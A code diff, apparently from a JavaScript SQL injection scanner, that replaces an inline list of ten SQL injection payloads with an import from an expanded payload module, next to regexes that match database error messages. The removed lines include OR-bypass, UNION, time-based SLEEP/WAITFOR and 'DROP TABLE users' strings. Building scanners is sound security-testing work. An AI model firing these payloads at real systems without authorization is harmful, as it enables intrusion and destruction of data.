@@ -1,15 +1,5 @@
-const SQLI_PAYLOADS = [
-  { payload: "' OR '1'='1", description: "Basic OR condition bypass" },
-  { payload: "' OR 1=1--", description: "SQL comment bypass" },
-  { payload: "\" OR \"\"=\"", description: "Double quote bypass" },
-  { payload: "' AND 1=1--", description: "AND true condition" },
-  { payload: "' AND 1=2--", description: "AND false condition" },
-  { payload: "'; DROP TABLE users--", description: "DROP statement attempt" },
-  { payload: "' WAITFOR DELAY '0:0:3'--", description: "Time-based detection (MSSQL)" },
-  { payload: "' OR SLEEP(3)--", description: "Time-based detection (MySQL)" },
-  { payload: "' UNION SELECT NULL--", description: "UNION injection" },
-  { payload: "'/**/OR/**/1=1--", description: "Obfuscated SQLi" },
-];
+const { SQLI_PAYLOADS_ENHANCED } = require('./payload-expansion');
+const SQLI_PAYLOADS = SQLI_PAYLOADS_ENHANCED;
 
 const ERROR_PATTERNS = [
   /SQL syntax.*MySQL/i,
